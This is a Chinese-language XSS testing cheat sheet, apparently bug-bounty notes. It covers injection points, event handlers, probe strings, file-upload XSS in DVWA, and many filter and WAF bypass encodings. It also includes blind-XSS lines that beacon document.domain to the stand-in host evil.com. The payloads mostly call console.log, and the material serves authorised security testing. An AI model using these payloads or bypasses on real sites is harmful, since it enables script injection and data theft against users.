Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application.

> 只可作用于触发 XSS 的网站, 如: 
>
> 在 example.com 上传 `xss.svg`, 打开时会调用 test.com 提供的 HTML 解析器并触发 XSS;
>
> 那么此时的 XSS 只作用于 test.com, 不会影响 example.com.

Reflected 和 DOM 时常不收, 留意公告

## 1. 原理

搜索 test 时, 服务器会将我输入的字符处理后返回到浏览器

```
GET /?search=test HTTP/2
Host: example.com
```

```
<input value="test" type="text">
```

若搜索的内容是一段 Payload, 如： `"onclick=console.log(null)"` 那么就会在浏览器注入 XSS

```
<input value=""onclick=console.log(null)"" type="text">
```

### 1.1. 存在位置

- 输入框
- URL

- 文件上传处

- 由请求包控制的值

  ```
  GET /?search=test HTTP/2
  Host: example.com
  Referer: https://example.com
  ```

  ```
  <input value="https://example.com" type="text">
  ```

  > 响应包中 `value` 的值由请求包中的 `Referer` 的值控制, 那么可能存在 XSS

### 1.2. 常用执行函数

| 弹窗验证      | 控制台验证          |
| ------------- | ------------------- |
| alert(null)   | console.log(null)   |
| confirm(null) | console.info(null)  |
| prompt(null)  | console.error(null) |
| print(null)   | console.warn(null)  |

若无法弹窗验证或者控制台验证可以尝试组合 CSRF 使用

```
<img src="http://example.com/logout">
```

### 1.4. 常用触发事件

加载事件

```
onload=console.log(null)	         # 元素加载完成时触发
onerror=console.log(null)         # 元素加载失败时触发
```

鼠标事件

```
onclick=console.log(null)	     # 点击元素时触发
ondblclick=console.log(null)      # 双击元素时触发
oncontextmenu=console.log(null)   # 右击元素时触发
onmousemove=console.log(null)	 # 鼠标移动到元素上方时触发
onmouseover=console.log(null)	 # 鼠标悬停在元素上方时触发
onmousedown=console.log(null)	 # 鼠标按下时触发
onmouseup=console.log(null)	     # 鼠标松开时触发
onmouseenter=console.log(null)    # 鼠标进入元素时触发
onmouseleave=console.log(null)    # 鼠标离开元素时触发
```

表单事件

```
onfocus=console.log(null)        # 元素获得焦点
onblur=console.log(null)         # 元素失去焦点
oninput=console.log(null)        # 用户输入时触发
onselect=console.log(null)       # 用户选中文本时触发
onsubmit=console.log(null)       # 表单提交时触发
onreset=console.log(null)        # 表单重置时触发
onchange=console.log(null)       # 输入框, 下拉框等内容变更后失焦
```

键盘事件

```
onkeydown=console.log(null)      # 按键按下
onkeypress=console.log(null)     # 按键按下并产生字符
onkeyup=console.log(null)        # 按键释放
```

## 2. 数据提交类

在目标网站提交使用 XSS 构造的数据.

### 2.1. 测试步骤

### 2.1.1. 查找注入点

- 测试输入框
- 测试 URL 
- 在 Burp Suite 的 Intruder 模块中标记请求包中所有可能触发 XSS 的位置, 然后使用 Sniper attack 模式注入一个随机字符串, 若在响应包中匹配到这个随机字符串则可能存在 XSS

### 2.1.2. 无害化测试

> 在 Burp 中测试 GET 请求时需要对空格进行 URL 编码, 若成功解析则响应中的标签是彩色的

使用无危害标签测试是否可以解析, 若可以解析则存在 HTML Injection, 可进一步测试 XSS

```
<s>1
%3Cs%3E1
'"><s>1
%27%22%3E%3Cs%3E1
'"><s>1#//--+
%27%22%3E%3Cs%3E1%23%2F%2F--%2B
'"></xmp></title></style></iframe></script></noembed></noscript></textarea><s>1#//--+
%27%22%3E%3C%2Fxmp%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Fiframe%3E%3C%2Fscript%3E%3C%2Fnoembed%3E%3C%2Fnoscript%3E%3C%2Ftextarea%3E%3Cs%3E1%23%2F%2F--%2B
```

某些标签的内容无法解析,需要闭合

```
</xmp>
</title>
</style>
</iframe>
</script>
</noembed>
</noscript>
</textarea>
```

提交这个字符串可以判断过滤了哪些字符

```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+console.log(null);//'>
```

使用 OOB 测试 Blind XSS

```
<img src=x onerror="new Image().src='https://evil.com?c='+document.domain;">
```

```
<script>new Image().src="https://evil.com?c="+document.domain;</script>
```

```
<script>navigator.sendBeacon("https://evil.com", document.domain);</script>
```

## 3. 文件解析类

在文件中嵌入恶意脚本后上传, 当目标加载文件时会触发 XSS 攻击.

常见的文件解析类 XSS 有 PDF-XSS, JPG-XSS, SVG-XSS, HTML-XSS, XML-XSS

> 触发 PDF-XSS 需要 PDF 查看器中可执行嵌入的 JavaScript, 如: Chromium
>
> 访问 PDF-XSS 链接时的请求参数不能随意删除, 否则无法触发
>
> 社工时可以使用 [iLovePDF](https://www.ilovepdf.com/zh-cn/merge_pdf) 将正常 PDF 与 PDF-XSS 合并
>
> 由于 PDF-XSS 只能弹窗, SRC 一般不收,要留意公告

> 触发 JPG-XSS 需要目标可解析 EXIF, 如: [Online EXIF Viewer](https://onlineexifviewer.com/)

若目标仅在前端校验可上传一张 PNG 文件，然后在 Burp Suite 中修改为 HTML

```http
Content-Disposition: form-data; name="uploaded"; filename="XSS.png"

 PNG
```

```http
Content-Disposition: form-data; name="uploaded"; filename="XSS.html"

 PNG
<script>console.log(null)</script>
```

从 Burp Suite 中查找关键词 XSS.html 得到路径后访问 URL 即可触发 XSS

```
../../hackable/uploads/XSS.html succesfully uploaded!
```

```
http://debian.local/dvwa/hackable/uploads/XSS.html
```

某些情况下文件上传处是通过编码上传的, 可以通过修改文件类型及文件编码嵌入 XSS

```
data:image/png;base64,VGhpcyBpcyBhIHRlc3QgZmllbGQ=
```

```
data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZyhudWxsKTwvc2NyaXB0Pg==
```

---

- [xss](https://github.com/jadensalas469466/tools/tree/main/hack/payload/xss)
- [pdfsvgxsspayload](https://github.com/ynsmroztas/pdfsvgxsspayload)

## 4. Bypass

引号闭合插入事件绕过

```
" onclick=console.log(null)
```

```
" autofocus onfocus=console.log(null) x="
```

尖括号闭合插入标签绕过

```
"><img/src/onerror=console.log(null)>
```

`href` 伪协议绕过

```
<a href=javascript:console.log(null)>1</a>
```

双写绕过

```
<a href=javascjavascriptript:console.log(null)>1</a>
```

大小写绕过

```
<a href=jaVaScRipT:console.log(null)>1</a>
```

URL 编码绕过

```
%27%22%3E%20%3Cimg%2Fsrc%2Fonerror%3Dconsole.log%28null%29%3E
```

添加 HTML 编码后的 Tab 绕过

```
<a href=javasc&#09;ript:console.log(null)>1</a>
```

## 5. 特殊情况

### 5.1. hidden

某些注入点可能被 `hidden` 隐藏

```
<input vule="payload" type="hidden">
```

修改为 `text` 即可

```
<input vule="payload" type="text">
```

### 5.2. ng-include

`ng-include` 可引入一个 URL 

```
<body><span class="ng-include:payload"></span></body>
```

若引入的 URL 存在 XSS 则可能对在当前网站生效

```
<body><span class="ng-include:'https://evil.com/xss.php?payload=<img/src/onerror=console.log(null)>'"></span></body>
```

默认情况下 ng-include 只能引入当前网站的 URL

```
<body><span class="ng-include:'/xss.php?payload=<img/src/onerror=console.log(null)>'"></span></body>
```

### 5.3.ng-app

被 `ng-app` 包裹的的指令, 可以尝试 `{{}}` 

```
{{constructor.constructor('console.log(null)')()}}
```

相当于

```
Function('console.log(null)')()
```

## 6. 编码

分隔符绕过，某些分隔符会让后面的字符串变成新的属性，例如：`<input type="text" name="p1" value="xss"> ,:;onmousemove="console.log(null)"` ，生成了 `onmousemove=""` 属性

```
xss"> ,:;onmousemove=console.log(null)
```

atob 解 Base64 编码绕过

```
<script>eval(atob("Y29uc29sZS5sb2cobnVsbCk="))</script>
```

尖括号的十六进制编码绕过

```
\\x3cscript\\x3econsole.log(null)\\x3c/script\\x3e
```

**js 中的编码 `<script></script>` 解码后执行**

ASCII

```
eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103,40,110,117,108,108,41))
```

Base64

```
eval(atob("Y29uc29sZS5sb2cobnVsbCk="))
```

**无需解码直接执行**

hex

```
eval("\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x6e\x75\x6c\x6c\x29")
```

unicode

```
\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067(\u006e\u0075\u006c\u006c)
```

jsfuck

```
[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()(([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[+[]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+([][[]]+[])[+!+[]]+([][[]]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]])
```

```
在 jsfuck 中 eval        =>  []["filter"]["constructor"]( CODE )()
```

伪协议绕过(空格可以用 / 代替)

```
<img/src/onerror=location="javascript:console.log(null)">
```

**目标执行顺序**

```
1.浏览器解析 HTML 标签	自动解码 HTML 的值	location="javascript:console.log(null)" 为 onerror 属性的值
2.浏览器解析 location 中的 url	自动解码 URL 编码 console.log(null)
3.浏览器识别 javascript 伪协议	自动解码 js 编码 console.log(null)	（括号和括号内的不能编两次）

黑客编码顺序反过来321

编码过程:JS编码→伪协议URL编码→HTML编码→（URL编码传输给服务器→服务器解码URL），（）中的为浏览器向目标传输数据的编码，无需操作

解码过程:解码HTML编码→伪协议解码URL编码→JS解释器自动解码JS编码→执行
```

1.对 console.log(null) 进行 unicode 编码（有的时候也可以直接对 () 进行编码，hex 不可以）

```
\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u006e\u0075\u006c\u006c\u0029
<img/src/onerror=location="javascript:\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u006e\u0075\u006c\u006c\u0029">
```

2.对 alert 的 unicode 编码进行 url 编码 （括号和括号里的值不能编两次，也可以不进行 unicode 编码而进行 url 编码，二者只能选择其一）

```
%5c%75%30%30%36%33%5c%75%30%30%36%66%5c%75%30%30%36%65%5c%75%30%30%37%33%5c%75%30%30%36%66%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%32%65%5c%75%30%30%36%63%5c%75%30%30%36%66%5c%75%30%30%36%37
```

```
<img/src/onerror=location="javascript:%5c%75%30%30%36%33%5c%75%30%30%36%66%5c%75%30%30%36%65%5c%75%30%30%37%33%5c%75%30%30%36%66%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%32%65%5c%75%30%30%36%63%5c%75%30%30%36%66%5c%75%30%30%36%37\u0028\u006e\u0075\u006c\u006c\u0029">
```

3.对 location="javascript:console.log(null)" 的 console.log(null) 进行 unicode 编码后又对 alert 进行编码后对  location="javascript:console.log(null)" 这个编码的结果再进行 html 编码

```
&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x36;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x66;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x36;&#x65;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x66;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x37;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x38;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x65;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x39;&#x22;
```

```
<img/src/onerror=&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x36;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x66;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x36;&#x65;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x66;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x37;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x38;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x65;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x63;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x32;&#x25;&#x39;&#x22;>
```

字符串切割：

```
字符串中的部分（""中的内容） "javascript:console.log(null)" 可以写成	"j"+"a"+"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+")"
```

```
<img/src/onerror=location="j"+"a"+"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"c"+"o"+"n"+"s"+"o"+"l"+"e"+"."+"l"+"o"+"g"+"("+"n"+"u"+"l"+"l"+")">
```

注释绕过（`/*注释*/`）

```
<input onfocus=location="java&#09;sc"+/**/"ript:\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u006e\u0075\u006c\u006c\u0029" autofocus>
```

注释加入到分割

```
<img/src/onerror=location="j"+"a"+/**/"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"c"+"o"+"n"+"s"+"o"+"l"+"e"+/**/"."+"l"+"o"+"g"+"("+"n"+"u"+"l"+"l"+")">
```

svg 可以自动解析 js 标签中的 html 编码

```
<svg><script>console.log(null)</script>
```

```
<svg><script>&#x63;&#x6f;&#x6e;&#x73;&#x6f;&#x6c;&#x65;&#x2e;&#x6c;&#x6f;&#x67;&#x28;&#x6e;&#x75;&#x6c;&#x6c;&#x29;</script>
```

null char

```
<\0s>1
<\x00s>1
<\u0000s>1
```

### IE

IE 浏览器 input 标签 style 属性伪协议绕过

```
style="background-image:url(javascript:console.log(null))"
```

IE 浏览器的 expression 绕过

```
hello:expression(console.log(null))
```

CSS 层叠样式表注释会替换为空

```
hello:expr/**/ession(console.log(null))
```

---

References

- [CWE-79](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-79)
- [The return of the ＜](https://hackerone.com/reports/639684)
- [Stored XSS in Wiki pages](https://hackerone.com/reports/526325)
- [Stored XSS on imgur profile](https://hackerone.com/reports/484434)
- [尖括号被过滤无法闭合?有没有尝试过用表情符号触发的XSS？](https://mp.weixin.qq.com/s/lF53d_DHEnYhch_H3R82DQ)
- [xss bypass备忘单|xss绕过防火墙技巧|xss绕过WAF的方法](https://www.ddosi.org/xss-bypass/)
- [DiscuzX2个人空间图片EXIF信息XSS](https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2012-07468)

